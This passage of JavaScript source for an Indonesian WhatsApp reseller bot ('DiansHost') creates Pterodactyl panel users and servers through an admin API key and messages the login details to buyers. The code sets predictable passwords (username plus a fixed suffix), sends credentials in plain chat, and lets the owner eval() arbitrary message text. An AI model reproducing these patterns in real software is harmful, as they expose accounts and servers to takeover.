if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
BY             
 DiansHostDiansHost

`)

}

break
case "3gb": {
    if (!isSeler) return m.reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/86a66c629f5747bebd5aa.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
case "4gb": {
    if (!isSeler) return m.reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/86a66c629f5747bebd5aa.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
BY             
 DiansHostDiansHost

`)

}

break
case "unli": {
    if (!isSeler) return m.reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/86a66c629f5747bebd5aa.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
BY             
 DiansHostDiansHost

`)

}

break
        break
case 'addusr2':{
if (!isCreator) return m.reply(`KHUSUS OWNER`)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "Rx112"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password 
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `

TYPE: user

ID: ${user.id}
UUID: ${user.uuid}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
LANGUAGE: ${user.language}
ADMIN: ${user.root_admin}
CREATED AT: ${user.created_at}

LOGIN: ${domain}

*PASSWORD BERHASIL DI KIRIM KE @${nomornya.split`@`[0]}*`
const sections = [
    {
        title: ` *DiansHost* `,
                rows: [
                {title: `PAKET 1GB CPU 100%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,1000/1000,100`,description: "CRATE PAKET 1GB CPU 100%"},
                {title: `PAKET 2GB CPU 200%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,2000/2000,200`,description: "CRATE PAKET 2GB CPU 200%"},
                {title: `PAKET 3GB CPU 300%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,3000/3000,300`,description: "CRATE PAKET 3GB CPU 300%"},    
                {title: `PAKET 4GB CPU 400%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,4000/4000,400`,description: "CRATE PAKET 4GB CPU 400%"},   
                {title: `PAKET 5GB CPU 500%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,5000/5000,500`,description: "CRATE PAKET 5GB CPU 500%"},    
                {title: `PAKET 6GB CPU 600%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,6000/6000,600`,description: "CRATE PAKET 6GB CPU 600%"},   
                {title: `PAKET 7GB CPU 700%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,7000/7000,700`,description: "CRATE PAKET 7GB CPU 700%"},   
                {title: `PAKET 8GB CPU 800%`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,8000/8000,800`,description: "CRATE PAKET 8GB CPU 800%"},    
                {title: `PAKET UNLI & CPU UNLI`, rowId: `${prefix}addsrv ${user.first_name},${tanggal},${user.id},15,1,0/0,0`,description: "CRATE PAKET UNLI & CPU UNLI"},   
                                             
]}]

    const listMessage = {
        text: tks,
        footer: "Rizal",
        title: "*SUCCESSFULLY ADD USER*",
        buttonText: "Click Here!",
        sections
    }
	
    await DiansHost.sendMessage(m.chat, listMessage)
    await DiansHost.sendMessage(nomornya, {
        text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password.toString()}
 *LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`,

    })
 }


break
case "addusr_4gb": {
    if (!isSeler) return m.reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4GB"
let egg = global.eggsnya
let loc = global.location
let memo = "4114"
let cpu = "400"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/86a66c629f5747bebd5aa.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
BY             
 DiansHostDiansHost

`)

}

break
case "5gb": {
    if (!isSeler) return m.reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/86a66c629f5747bebd5aa.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
BY             
 DiansHost

`)

}

break
case "addusr_unli": {
    if (!isSeler) return   m.reply(`ada ada saja kamu ini`)
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unlimited"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/86a66c629f5747bebd5aa.jpg" 
if (!u) return
let d = (await DiansHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *USERNAME* : ${user.username}
 *PASSWORD* : ${password}
 *LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DiansHost.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DiansHost.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "setppbot": {
if (!isCreator) return 
m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await DiansHost.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await DiansHost.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await DiansHost.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
break
 


default:}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})